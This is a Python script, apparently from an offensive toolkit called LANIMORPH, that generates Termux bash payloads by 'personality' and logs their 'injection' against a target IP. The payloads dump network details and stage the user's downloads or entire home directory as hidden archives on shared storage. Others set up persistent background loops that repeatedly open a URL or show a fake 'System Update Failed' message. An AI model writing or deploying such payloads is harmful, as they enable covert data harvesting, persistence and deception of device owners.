#!/usr/bin/env python3
import argparse
import os
import random
from datetime import datetime

# === Define personalities and base payloads ===
PERSONALITIES = {
    "scout": [
        '#!/data/data/com.termux/files/usr/bin/bash\nif ! command -v ip >/dev/null; then echo "missing ip"; exit 1; fi\nip addr > /sdcard/.netdump.txt\n',
        '#!/data/data/com.termux/files/usr/bin/bash\nping -c 3 192.168.1.44 > /sdcard/.pingtest.txt\n'
    ],
    "leech": [
        '#!/data/data/com.termux/files/usr/bin/bash\ncp -r ~/downloads /sdcard/.dl_backup\n',
        '#!/data/data/com.termux/files/usr/bin/bash\ntar -czf /sdcard/.home.tgz ~/\n'
    ],
    "parasite": [
        '#!/data/data/com.termux/files/usr/bin/bash\nwhile true; do am start -a android.intent.action.VIEW -d "http://example.com" >/dev/null 2>&1; sleep 3600; done &\n',
        '#!/data/data/com.termux/files/usr/bin/bash\nwhile true; do termux-toast "System Update Failed"; sleep 1800; done &\n'
    ]
}

# === Parse arguments ===
parser = argparse.ArgumentParser(description="Mutate and inject payload")
parser.add_argument("target", help="Target IP address")
parser.add_argument("--personality", choices=PERSONALITIES.keys(), default="scout", help="Payload personality")
args = parser.parse_args()

# === Generate payload ===
payload = random.choice(PERSONALITIES[args.personality])
payload_filename = f"{args.personality}_payload.sh"
payload_path = os.path.expanduser(f"~/LANIMORPH/payloads/{payload_filename}")

os.makedirs(os.path.dirname(payload_path), exist_ok=True)
with open(payload_path, "w") as f:
    f.write(payload)

os.chmod(payload_path, 0o755)
print(f"[✓] Injected: {payload_filename} with personality {args.personality}")

# === Drop to vault ===
vault_path = os.path.expanduser("~/LANIMORPH/vault")
os.makedirs(vault_path, exist_ok=True)
out_path = os.path.join(vault_path, "vault_drop.txt")
with open(out_path, "w") as f:
    f.write(payload_path + "\n")
print(f"[✓] Payload written to vault: {out_path}")

# === Log injection to inject_silent.log ===
log_path = os.path.expanduser("~/LANIMORPH/beacons/inject_silent.log")
timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
try:
    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    with open(log_path, "a") as log:
        log.write(f"{timestamp}|{args.target}|{payload_path}\n")
    print(f"[✓] Logged injection to {log_path}")
except Exception as e:
    print(f"[!] Failed to log injection: {e}")
